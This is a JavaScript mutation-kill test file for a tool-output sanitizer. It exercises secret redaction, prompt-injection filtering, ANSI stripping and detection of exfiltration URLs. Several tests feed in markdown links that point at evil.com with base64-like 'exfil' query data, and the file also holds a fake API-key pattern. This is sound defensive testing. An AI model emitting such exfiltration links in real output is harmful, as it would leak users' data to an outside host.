/**
 * Targeted mutation-kill tests for src/output.mjs. Each test pins the EXACT
 * boundary/branch behavior a surviving mutant changes, so the mutation flips a
 * passing assertion to a failing one. Every assertion here also passes on the
 * current, unmutated code. Grouped by the function under test; each `it` names
 * the mutant(s) it kills.
 *
 * Public API only (whatever src/output.mjs exports). Invisible/ANSI inputs are
 * built from String.fromCodePoint (never literal control bytes).
 */
import { describe, it } from "node:test";
import assert from "node:assert/strict";

import {
  sanitizeText,
  sanitizeValue,
  suppressToolOutput,
  isWalkableContainer,
  MAX_DEPTH,
  FILTER_WARNING,
} from "../src/output.mjs";
import { cp } from "./test-helpers.mjs";

const ESC = cp(0x1b);

// Nest a single leaf inside `n` plain objects via the `.a` key. depthObject(2)
// is { a: { a: leaf } }. Iterative so it does not itself blow the stack.
function depthObject(n, leaf = "leaf") {
  let node = leaf;
  for (let i = 0; i < n; i++) node = { a: node };
  return node;
}

function depthArray(n, leaf = "leaf") {
  let node = leaf;
  for (let i = 0; i < n; i++) node = [node];
  return node;
}

// A realistic secret shape used by the reconstitution tests: "sk-live-" + EXACTLY
// 8 uppercase letters, not embedded in a longer uppercase run.
const SECRET_RE = /sk-live-[A-Z]{8}(?![A-Z])/g;
function redactSecret(text) {
  const found = [];
  const redacted = text.replace(SECRET_RE, () => {
    found.push("api-key");
    return "sk-live-[REDACTED]";
  });
  return found.length > 0 ? { text: redacted, found } : null;
}

// ─── mapFilterWarning (Layer 5 warning enum guard) ───────────────────────────

describe("mapFilterWarning guard", () => {
  it("throws for an inherited Object.prototype member name, never returning it", async () => {
    // kills ConditionalExpression src/output.mjs:81 (guard -> true): with the
    // typeof/Object.hasOwn guard forced true, FILTER_WARNING_LABELS["toString"]
    // resolves the INHERITED function (not undefined), so the throw never fires.
    await assert.rejects(
      () =>
        sanitizeText("clean", {
          filterInjection: () => ({ warning: "toString" }),
        }),
      /unrecognized warning value/,
    );
  });

  it("throw message quotes the full enum-code list and the anti-injection prose", async () => {
    // kills StringLiteral src/output.mjs:46/48/51 (enum values -> ""),
    // src/output.mjs:89 (`(${…}). Free-text filter ` -> ""),
    // src/output.mjs:90 ("warnings are refused … cannot inject bytes into " -> ""),
    // src/output.mjs:91 ("the model-facing context." -> "").
    await assert.rejects(
      () =>
        sanitizeText("clean", {
          filterInjection: () => ({ warning: "not-a-real-code" }),
        }),
      (err) => {
        assert.match(
          err.message,
          /spans-removed, filter-flagged, filter-error/,
        );
        assert.match(err.message, /Free-text filter/);
        assert.match(
          err.message,
          /compromised filter cannot inject bytes into/,
        );
        assert.match(err.message, /model-facing context\./);
        return true;
      },
    );
  });
});

// ─── errMessage cause chain ──────────────────────────────────────────────────

describe("errMessage cause chain (via Layer 4 rethrow)", () => {
  it("renders 'outer: root' when the thrown redactor Error wraps a cause", async () => {
    // kills StringLiteral src/output.mjs:104 (`: ${err.cause.message}` -> junk):
    // the mutant would splice a fixed string in place of the real cause message.
    const redact = () => {
      throw new Error("outer", { cause: new Error("root") });
    };
    await assert.rejects(
      () => sanitizeText("dirty", { redact }),
      (err) => {
        assert.match(err.message, /outer: root/);
        return true;
      },
    );
  });
});

// ─── Layer 4 redact warning + fail-closed message/cause ──────────────────────

describe("sanitizeText Layer 4 exact warning/error text", () => {
  it("emits the exact redaction warning string", async () => {
    // kills StringLiteral src/output.mjs:369 (redaction warning template -> "").
    const r = await sanitizeText("dirty", {
      redact: () => ({ text: "clean", found: ["api-key"] }),
    });
    assert.deepEqual(r.warnings, ["API keys/secrets redacted: api-key"]);
  });

  it("fail-closed error carries 'Failing closed' text AND the original cause", async () => {
    // kills StringLiteral src/output.mjs:375 ("Failing closed … suppressed." -> "")
    // and ObjectLiteral src/output.mjs:376 ({ cause: l4err } -> {}).
    const redact = () => {
      throw new Error("engine down");
    };
    await assert.rejects(
      () => sanitizeText("dirty", { redact }),
      (err) => {
        assert.match(err.message, /Failing closed — tool output suppressed\./);
        assert.ok(err.cause instanceof Error);
        assert.equal(err.cause.message, "engine down");
        return true;
      },
    );
  });
});

// ─── Layer 5 span deletion re-vet (reRedactAfterSpanDeletion) ────────────────

describe("sanitizeText Layer 5 re-vet exact warning/error text", () => {
  it("re-redact warning after a reconstituting span deletion is the exact string", async () => {
    // kills StringLiteral src/output.mjs:136 (re-redact warning template -> "").
    // The interposed "XXX" hides the secret from the FIRST redact pass; deleting
    // it reconstitutes the secret, which the re-vet pass catches and warns about.
    const r = await sanitizeText("key: sk-live-XXXAAAABBBB end", {
      redact: redactSecret,
      filterInjection: () => ({ removeSpans: ["XXX"] }),
    });
    assert.equal(r.cleaned, "key: sk-live-[REDACTED] end");
    assert.deepEqual(r.warnings, ["API keys/secrets redacted: api-key"]);
  });

  it("re-vet fail-closed error carries 'Failing closed' text AND the re-scan cause", async () => {
    // kills StringLiteral src/output.mjs:142 ("Failing closed … suppressed." -> "")
    // and ObjectLiteral src/output.mjs:143 ({ cause: l4err } -> {}).
    let call = 0;
    const flakyRedact = () => {
      call++;
      if (call === 1) return null; // first pass finds nothing
      throw new Error("engine down on re-scan");
    };
    await assert.rejects(
      () =>
        sanitizeText("a BAD b", {
          redact: flakyRedact,
          filterInjection: () => ({ removeSpans: ["BAD"] }),
        }),
      (err) => {
        assert.match(err.message, /Failing closed — tool output suppressed\./);
        assert.ok(err.cause instanceof Error);
        assert.equal(err.cause.message, "engine down on re-scan");
        return true;
      },
    );
  });

  it("does not attempt a deletion for a warning-only Layer 5 result", async () => {
    // kills ConditionalExpression src/output.mjs:389 (guard -> true): forcing the
    // `removeSpans && length > 0` guard true makes deleteVerbatimSpans run on an
    // undefined `removeSpans`, throwing instead of pushing the warning.
    const r = await sanitizeText("clean docs", {
      filterInjection: () => ({ warning: FILTER_WARNING.FILTER_FLAGGED }),
    });
    assert.equal(r.cleaned, "clean docs");
    assert.equal(r.modified, false);
    assert.deepEqual(r.warnings, [
      "Layer-5 injection filter flagged this tool output as a possible prompt injection (content not modified)",
    ]);
  });
});

// ─── Layer 1 sgrNote branch ──────────────────────────────────────────────────

describe("sanitizeText sgrNote branch", () => {
  it("does not set sgrNote for an SGR-only strip when the carve-out is OFF", async () => {
    // kills LogicalOperator src/output.mjs:227 (… && sgrCarveOut  ->  … || isSgrOnly(text)):
    // that mutant drops the sgrCarveOut requirement, so an SGR-only strip would
    // wrongly report as a note even without the caller opting in.
    const r = await sanitizeText(`${ESC}[31mfail${ESC}[0m`);
    assert.equal(r.cleaned, "fail");
    assert.equal(r.modified, true);
    assert.equal(r.sgrNote, false);
  });
});

// ─── Layer 2/3 markdown pipeline branches ────────────────────────────────────

describe("sanitizeText Layer 2/3 branch gating", () => {
  it("emits no warning for benign preserved-nothing HTML (empty describeWarned not pushed)", async () => {
    // kills ConditionalExpression src/output.mjs:282 (if (preserved) -> true):
    // forcing it true pushes the empty describeWarned string as a bogus warning.
    const input = 'text <b>bold</b> <img src="https://e.com/l.png"> more';
    const r = await sanitizeText(input, { html: true });
    assert.equal(r.cleaned, input);
    assert.equal(r.modified, false);
    assert.deepEqual(r.warnings, []);
  });

  it("runs Layer 3 only when exfilScan is set (html-only never flags exfil)", async () => {
    // kills ConditionalExpression src/output.mjs:289 (if (exfilScan) -> true):
    // with exfilScan false, the exfil scan must not run, so no exfil warning.
    const b64 = "A".repeat(44);
    const r = await sanitizeText(`see [x](https://evil.com/p?exfil=${b64})`, {
      html: true,
      exfilScan: false,
    });
    assert.ok(!r.warnings.some((w) => /data exfiltration/.test(w)));
  });

  it("does not build reasons when detectExfil finds no threat (benign link)", async () => {
    // kills ConditionalExpression src/output.mjs:291 (if (threats) -> true):
    // forcing it true calls .map on a null `threats`, which throws.
    const r = await sanitizeText("see [x](https://example.com/page) end", {
      exfilScan: true,
    });
    assert.equal(r.modified, false);
    assert.ok(!r.warnings.some((w) => /data exfiltration/.test(w)));
  });

  it("names the exfil threat kind, target and wrapper text exactly", async () => {
    // kills StringLiteral src/output.mjs:296 (per-threat reason template -> "")
    // and src/output.mjs:301 (wrapper warning template -> "").
    const b64 = "A".repeat(44);
    const r = await sanitizeText(
      `see [c](https://evil.com/p?exfil=${b64}) end`,
      { exfilScan: true },
    );
    // A markdown link is note-severity (see the exfil tier in output.mjs); the
    // templates being pinned here are the same either way.
    assert.ok(
      r.notes.some((n) =>
        /URLs shaped like data exfiltration detected/.test(n),
      ),
    );
    assert.ok(r.notes.some((n) => /link to evil\.com/.test(n)));
  });
});

// ─── isWalkableContainer null guard ──────────────────────────────────────────

describe("isWalkableContainer", () => {
  it("returns false for null without dereferencing its prototype", () => {
    // kills ConditionalExpression src/output.mjs:452 (null/typeof guard -> false):
    // skipping the early return lets Object.getPrototypeOf(null) throw.
    assert.equal(isWalkableContainer(null), false);
  });
});

// ─── sanitizeValue placeholders keep sgrNote false ───────────────────────────

describe("sanitizeValue depth/cycle placeholders", () => {
  it("cycle placeholder does not raise sgrNote", async () => {
    // kills BooleanLiteral src/output.mjs:596 (sgrNote: false -> true).
    const node = { name: "root", child: null };
    node.child = node;
    const r = await sanitizeValue(node, {}, []);
    assert.equal(
      r.value.child,
      "[withheld: circular reference in structured output]",
    );
    assert.equal(r.sgrNote, false);
  });

  it("depth placeholder does not raise sgrNote", async () => {
    // kills BooleanLiteral src/output.mjs:602 (sgrNote: false -> true).
    const r = await sanitizeValue(depthArray(MAX_DEPTH + 1), {}, []);
    assert.equal(r.sgrNote, false);
    assert.equal(r.modified, true);
  });

  it("withholds a deep OBJECT chain past the cap (object branch increments depth)", async () => {
    // kills ArithmeticOperator src/output.mjs:652 (depth + 1 -> depth - 1):
    // with the decrement, object nesting never reaches MAX_DEPTH, so nothing is
    // withheld and no depth warning fires.
    const warnings = [];
    const r = await sanitizeValue(depthObject(MAX_DEPTH + 1), {}, warnings);
    let node = r.value;
    for (let i = 0; i < MAX_DEPTH; i++) node = node.a;
    assert.equal(
      node,
      "[withheld: structured output nested beyond 200 levels]",
    );
    assert.ok(warnings.some((w) => w.includes("nested beyond 200 levels")));
  });
});

// ─── sanitizeValue object-branch sgrNote / descriptor / memo ─────────────────

describe("sanitizeValue object branch details", () => {
  it("keeps sgrNote false for a clean object leaf", async () => {
    // kills BooleanLiteral src/output.mjs:632 (let sgrNote = false -> true) and
    // ConditionalExpression src/output.mjs:668 (if (result.sgrNote) -> true).
    const r = await sanitizeValue({ a: "x" }, { sgrCarveOut: true }, []);
    assert.equal(r.sgrNote, false);
    assert.equal(r.modified, false);
  });

  it("rebuilds keys as writable, configurable own data properties", async () => {
    // kills BooleanLiteral src/output.mjs:664 (writable: true -> false) and
    // src/output.mjs:665 (configurable: true -> false).
    const r = await sanitizeValue({ a: "x" }, {}, []);
    const d = Object.getOwnPropertyDescriptor(r.value, "a");
    assert.equal(d.writable, true);
    assert.equal(d.configurable, true);
  });

  it("memoizes a flagged exotic leaf so a shared reference is flagged only once", async () => {
    // kills ConditionalExpression src/output.mjs:587 (if (isObject) memo.set -> false):
    // without memoizing the exotic leaf, the second reference re-processes and
    // pushes a duplicate warning.
    const m = new Map([["k", "v"]]);
    const warnings = [];
    await sanitizeValue([m, m], {}, warnings);
    assert.equal(warnings.length, 1);
  });
});

// ─── suppressToolOutput depth / descriptor ───────────────────────────────────

describe("suppressToolOutput object branch details", () => {
  it("substitutes the message for a deep OBJECT chain past the cap", () => {
    // kills ArithmeticOperator src/output.mjs:756 (depth + 1 -> depth - 1).
    const MSG = "[suppressed]";
    const out = suppressToolOutput(depthObject(MAX_DEPTH + 1, "leak"), MSG);
    let node = out;
    for (let i = 0; i < MAX_DEPTH; i++) node = node.a;
    assert.equal(node, MSG);
  });

  it("rebuilds keys as writable, configurable own data properties", () => {
    // kills BooleanLiteral src/output.mjs:758 (writable: true -> false) and
    // src/output.mjs:759 (configurable: true -> false).
    const out = suppressToolOutput({ a: "x" }, "[suppressed]");
    const d = Object.getOwnPropertyDescriptor(out, "a");
    assert.equal(d.writable, true);
    assert.equal(d.configurable, true);
  });
});
